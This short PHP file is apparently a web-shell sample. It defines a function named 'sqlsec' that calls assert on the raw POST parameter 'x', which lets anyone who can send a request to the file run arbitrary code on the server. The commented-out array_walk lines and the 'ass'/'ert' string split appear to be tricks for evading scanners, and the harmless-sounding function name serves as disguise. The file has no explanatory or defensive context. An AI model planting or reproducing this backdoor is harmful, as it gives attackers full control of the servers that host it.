<?php
    function sqlsec($value,$key)
    {   
        $x = $key.$value;
        assert($_POST['x']);
    }
    // $a=array("ass"=>"ert");
    // array_walk($a,"sqlsec");
    sqlsec("ass","ert");
?>
